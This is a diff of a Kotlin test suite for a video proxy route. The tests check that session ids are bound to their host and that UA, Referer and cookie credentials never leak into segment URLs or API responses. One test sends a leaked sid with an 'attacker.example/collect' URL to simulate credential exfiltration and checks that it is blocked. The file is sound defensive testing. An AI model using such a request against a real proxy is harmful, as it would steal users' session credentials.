@@ -9,10 +9,15 @@ import com.animeko.web.proxy.ProxySessionStore
 import io.ktor.client.request.get
 import io.ktor.client.request.header
 import io.ktor.client.request.parameter
+import io.ktor.client.request.setBody
+import io.ktor.client.request.post
 import io.ktor.client.statement.bodyAsText
+import io.ktor.http.ContentType
 import io.ktor.http.HttpHeaders
 import io.ktor.http.HttpStatusCode
+import io.ktor.http.contentType
 import io.ktor.server.testing.testApplication
+import java.net.URLEncoder
 import java.nio.file.Files
 import java.util.Base64
 import kotlin.test.Test
@@ -26,7 +31,10 @@ import kotlin.test.assertTrue
  * 这段链路此前没有任何测试（数据源测试里的 fetchStream 直接抛异常），
  * 而 SSRF、重定向、鉴权头透传等问题全部集中在它身上。
  */
-private class StreamStubFetcher(private val specs: List<Spec>) : Fetcher {
+private class StreamStubFetcher(
+    private val specs: List<Spec>,
+    private val html: Map<String, String> = emptyMap(),
+) : Fetcher {
     val requests = mutableListOf<Pair<String, Map<String, String>>>()
 
     data class Spec(
@@ -51,11 +59,18 @@ private class StreamStubFetcher(private val specs: List<Spec>) : Fetcher {
         return StreamResult(spec.status, merged, spec.body.byteInputStream())
     }
 
+    val fetchHeaders = mutableListOf<Pair<String, Map<String, String>>>()
+
     override suspend fun fetch(
         url: String,
         headers: Map<String, String>,
         followRedirects: Boolean,
-    ): HttpResult = throw UnsupportedOperationException("本测试只覆盖代理链路")
+    ): HttpResult {
+        fetchHeaders.add(url to LinkedHashMap(headers))
+        val body = html[url] ?: html.entries.firstOrNull { url.startsWith(it.key) }?.value
+            ?: throw IllegalStateException("no fixture for $url")
+        return HttpResult(200, mapOf("content-type" to listOf("text/html")), body.toByteArray())
+    }
 
     override suspend fun post(
         url: String,
@@ -79,6 +94,9 @@ private fun redirect(location: String) = StreamStubFetcher.Spec(
 private const val UA = "SecretUA/1.0"
 private const val REFERER = "https://v.example.com/watch"
 private const val COOKIE = "token=***"
+private const val MEDIA = "https://cdn.example.com/hls/index.m3u8"
+
+private fun enc(v: String): String = URLEncoder.encode(v, "UTF-8")
 
 class ProxyRouteTest {
 
@@ -91,10 +109,14 @@ class ProxyRouteTest {
         allowPrivate: Boolean = true,
         authEnabled: Boolean = false,
         token: String? = null,
+        val html: Map<String, String> = emptyMap(),
     ) {
-        val stub = StreamStubFetcher(specs)
+        val stub = StreamStubFetcher(specs, html)
         val sessions = ProxySessionStore()
-        val sid: String = sessions.put(UA, REFERER, COOKIE)
+
+        /** sid 绑定主机：按真实解析地址登记，只有那台主机能用它 */
+        fun sessionFor(url: String): String = sessions.put(url, UA, REFERER, COOKIE)
+        val sid: String = sessionFor(MEDIA)
         val cfg = AppConfig(
             dataDir = Files.createTempDirectory("animeko-proxy-test"),
             frontendDir = "definitely-not-exist",
@@ -123,9 +145,14 @@ class ProxyRouteTest {
 
         // 但改写出来的分片地址只带 sid，不带任何凭据
         assertTrue(text.contains("sid=${h.sid}"), text)
-        assertFalse(text.contains(UA), "凭据被复制到分片 URL 上了：$text")
-        assertFalse(text.contains(COOKIE), "凭据被复制到分片 URL 上了：$text")
-        assertFalse(text.contains("referer="), "凭据被复制到分片 URL 上了：$text")
+        // 必须连百分号编码形式与参数名一起查：旧实现写的是 &ua=SecretUA%2F1.0，
+        // 只断言 contains(原文) 对 broken 实现也会假通过
+        for (leaked in listOf(UA, REFERER, COOKIE, enc(UA), enc(REFERER), enc(COOKIE))) {
+            assertFalse(text.contains(leaked), "分片地址泄露了凭据「$leaked」：$text")
+        }
+        for (key in listOf("ua=", "referer=", "cookie=")) {
+            assertFalse(text.contains(key), "分片地址残留凭据参数「$key」：$text")
+        }
     }
 
     @Test
@@ -168,8 +195,9 @@ class ProxyRouteTest {
     fun `session header values are passed through unchanged`() {
         // UA/cookie 里含空格、字面 + 和 % 很常见（base64 令牌、带签名的 referer）
         val tricky = ProxySessionStore()
-        val sid = tricky.put("Player/1.0 build+7 q=50%", "https://a.example/x?y=1&z=2", "sid=a+b%2Bc")
-        val stored = checkNotNull(tricky.headers(sid))
+        val target = "https://a.example/v/index.m3u8"
+        val sid = tricky.put(target, "Player/1.0 build+7 q=50%", "https://a.example/x?y=1&z=2", "sid=a+b%2Bc")
+        val stored = tricky.grant(sid, target).headers
         assertEquals("Player/1.0 build+7 q=50%", stored["User-Agent"])
         assertEquals("https://a.example/x?y=1&z=2", stored["Referer"])
         assertEquals("sid=a+b%2Bc", stored["Cookie"])
@@ -222,7 +250,7 @@ class ProxyRouteTest {
         assertEquals(COOKIE, h.stub.requests[0].second["Cookie"])
         assertFalse("Cookie" in h.stub.requests[1].second, "跨主机重定向后不该继续携带源站 Cookie")
         // 会话本身不能被这次跳转改坏，否则后续分片会莫名丢凭据
-        assertEquals(COOKIE, h.sessions.headers(h.sid)?.get("Cookie"))
+        assertEquals(COOKIE, h.sessions.grant(h.sid, MEDIA).headers["Cookie"])
     }
 
     @Test
@@ -325,6 +353,74 @@ class ProxyRouteTest {
         assertEquals(HttpStatusCode.PartialContent, resp.status)
         assertNull(resp.headers[HttpHeaders.ContentEncoding], "视频响应被压缩了，Range/长度都会对不上")
         assertEquals("bytes 0-1/10", resp.headers["Content-Range"])
+    }
+
+    @Test
+    fun `a leaked sid cannot be used to send credentials to another host`() = testApplication {
+        // sid 出现在浏览器历史与访问日志里，泄漏是可预期的；绑定目标主机后，
+        // 拿着它也无法让服务端带着源站 Cookie 去攻击者指定的地址。
+        val h = Harness(listOf(hlsPlaylist("seg1.ts")))
+        application { module(h.cfg, h.stub, h.sessions) }
+        val resp = client.get("/api/proxy") {
+            parameter("url", "https://attacker.example/collect?c=1.m3u8")
+            parameter("sid", h.sid)
+        }
+        assertEquals(HttpStatusCode.Forbidden, resp.status)
+        assertTrue(resp.bodyAsText().contains("PROXY_SESSION_TARGET_MISMATCH"), resp.bodyAsText())
+        assertTrue(h.stub.requests.isEmpty(), "主机校验失败前不该打上游")
+    }
+
+    @Test
+    fun `video route mints a session and never ships the credentials`() = testApplication {
+        val configJson = """
+            {"factoryId":"web-selector","version":2,"arguments":{"name":"解析源","searchConfig":{
+              "rawBaseUrl":"https://example-site.test",
+              "searchUrl":"https://example-site.test/s?q={keyword}",
+              "subjectFormatId":"a","channelFormatId":"no-channel",
+              "matchVideo":{"enableNestedUrl":false,"matchVideoUrl":"index[.]m3u8",
+                "cookies":"sess=COOKIEVALUE",
+                "addHeadersToVideo":{"referer":"https://ref.example/p","userAgent":"UAHEADER/9.9"}}}}}
+        """.trimIndent()
+        val h = Harness(
+            listOf(hlsPlaylist("seg1.ts")),
+            html = mapOf(
+                "https://example-site.test/play/1.html" to
+                    """<html><body><a href="https://cdn.example.com/hls/index.m3u8">播放</a></body></html>""",
+            ),
+        )
+        application { module(h.cfg, h.stub, h.sessions) }
+        val imported = client.post("/api/selector/sources") {
+            contentType(ContentType.Application.Json)
+            setBody(configJson)
+        }
+        assertEquals(HttpStatusCode.Created, imported.status, imported.bodyAsText())
+        val resp = client.post("/api/selector/sources/解析源/video") {
+            contentType(ContentType.Application.Json)
+            setBody("""{"playUrl":"https://example-site.test/play/1.html"}""")
+        }
+        val body = resp.bodyAsText()
+        assertEquals(HttpStatusCode.OK, resp.status, body)
+        // 凭据不再下发给浏览器
+        for (secret in listOf("COOKIEVALUE", "UAHEADER/9.9", "ref.example")) {
+            assertFalse(body.contains(secret), "解析响应泄露了「$secret」：$body")
+        }
+        assertTrue(body.contains("\"proxyPath\""), body)
+
+        // 解析播放页时确实按正确的头去取（位置传参写反也能在这里被抓到）
+        val fetched = h.stub.fetchHeaders.single().second
+        assertEquals("UAHEADER/9.9", fetched["User-Agent"])
+        assertEquals("https://ref.example/p", fetched["Referer"])
+        assertEquals("sess=COOKIEVALUE", fetched["Cookie"])
+
+        // 顺着 proxyPath 取清单，再把改写出的分片地址请求一遍：
+        // 会话必须能把同一套头补上，否则防盗链源会全线 403
+        val proxyPath = Regex(""""proxyPath":"([^"]+)"""").find(body)!!.groupValues[1]
+        val playlist = client.get(proxyPath).bodyAsText()
+        assertTrue("sid=" in playlist, playlist)
+        val seg = playlist.lines().last { it.isNotBlank() && !it.startsWith("#") }
+        assertEquals(HttpStatusCode.OK, client.get(seg).status, "分片地址 $seg 取不回内容")
+        val segHeaders = h.stub.requests.last().second
+        assertEquals("sess=COOKIEVALUE", segHeaders["Cookie"], "分片请求没带上会话里的 Cookie")
     }
 
     @Test
